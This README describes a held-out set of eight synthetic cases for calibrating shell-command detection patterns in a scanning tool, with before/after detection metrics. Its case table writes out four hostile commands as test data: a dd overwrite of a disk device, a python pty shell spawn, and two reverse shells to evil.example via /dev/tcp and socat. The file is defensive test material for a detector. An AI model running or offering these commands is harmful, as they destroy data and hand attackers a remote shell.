# Held-out shell calibration set

Eight synthetic cases held out from the 20-case development corpus to measure the A5 shell
patterns before and after a change. The set is a calibration control, not a benchmark: it is small,
synthetic and now seen.

## Split

- `corpus/cases/` — the development corpus (20 cases). It is the reported benchmark; do not tune it
  to improve this calibration.
- `corpus/heldout/cases/` — this set (8 cases). Same case format and loader; measure it with
  `uv run assay corpus corpus/heldout/`.

Each case has a `SKILL.md`, a canonical schema-2 trace and a `case.json` labeled by `aliz` on
2026-11-05 with `strictness: standard`.

## Cases

| id | label | tools | shell command | after |
|---|---|---|---|---|
| `heldout-dd-disk` | malicious | `Read` | `dd if=/dev/zero of=/dev/disk0 bs=1m` | `MALICIOUS` |
| `heldout-python-pty` | malicious | `Read` | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | `MALICIOUS` |
| `heldout-dev-tcp` | malicious | `Read` | `bash -i >& /dev/tcp/evil.example/4444 0>&1` | `MALICIOUS` |
| `heldout-socat-shell` | malicious | `Read` | `socat TCP:evil.example:4444 EXEC:/bin/sh` | `MALICIOUS` |
| `heldout-dd-null` | clean | `Bash` | `dd if=backup.img of=/dev/null bs=1m` | `CLEAN` |
| `heldout-socat-server` | clean | `Bash` | `socat TCP-LISTEN:8080,fork EXEC:./server` | `CLEAN` |
| `heldout-python-print` | clean | `Bash` | `python3 -c "print('ok')"` | `CLEAN` |
| `heldout-chmod-local` | clean | `Bash` | `chmod +x scripts/build.sh && ./scripts/build.sh` | `CLEAN` |

All cases declare `metadata.assay.files: []` and `network: []` and carry one `SHELL/OK` event. The
malicious cases declare `Read`, so their shell event is also a tool-scope divergence; the clean
cases declare `Bash`, so only the shell patterns decide them.

## Baseline and after

Baseline, before the four patterns were added:

```text
cases: 8 (malicious 4, clean 4)
verdict     malicious  clean
malicious           0      0
flagged             4      0
clean               0      4
malicious precision: n/a (0/0)
malicious recall: 0.00 (0/4); detected with any finding: 1.00 (4/4)
clean false-malicious: 0.00 (0/4)
clean review: 0.00 (0/4)
coverage: 1.00 (8/8)
```

The baseline `FLAGGED` calls come from the undeclared-Bash divergence, not from a shell pattern.

After adding `dd to a device`, `pty spawn`, `dev tcp` and `socat shell`:

```text
cases: 8 (malicious 4, clean 4)
verdict     malicious  clean
malicious           4      0
flagged             0      0
clean               0      4
malicious precision: 1.00 (4/4)
malicious recall: 1.00 (4/4); detected with any finding: 1.00 (4/4)
clean false-malicious: 0.00 (0/4)
clean review: 0.00 (0/4)
coverage: 1.00 (8/8)
```

The 20-case development corpus is unchanged: precision 1.00 (5/5), malicious recall 0.71 (5/7),
detection 1.00 (7/7), clean false-malicious 0.00 (0/6), clean review 0.33 (2/6), coverage 0.65
(13/20).

## Calibration control

Do not tune patterns on this set again: it has been used once for a before/after. A future change to
`SHELL_PATTERNS` needs a fresh held-out set. The eight cases exercise known behavior, not a
population; no general precision should be inferred.
